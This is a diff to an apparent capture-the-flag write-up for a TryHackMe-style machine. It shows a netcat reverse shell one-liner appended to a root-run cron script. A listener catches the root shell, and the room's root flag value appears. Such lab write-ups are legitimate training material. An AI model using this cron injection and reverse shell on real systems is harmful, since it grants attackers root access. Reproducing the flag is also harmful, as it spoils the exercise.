@@ -124,15 +124,17 @@ drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
 
 looks like id.sh is runs every minute with root creads
 
+```
 tomcat@ubuntu:/home/jack$ cat id.sh
 cat id.sh
 #!/bin/bash
 id > test.txt
 tomcat@ubuntu:/home/jack$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.28.108 9001 >/tmp/f" >> id.sh
 </f;cat /tmp/f|sh -i 2>&1|nc 10.8.28.108 9001 >/tmp/f" >> id.sh              
+```
 
 ## Get root shell
-
+```
 ┌──(kali㉿kali)-[~/Documents/THM/THM_Thompson]
 └─$ nc -lvnp 9001                 
 listening on [any] 9001 ...
@@ -148,4 +150,4 @@ user.txt
 root.txt
 # cat root.txt
 d89d5391984c0450a95497153ae7ca3a
-
+```+
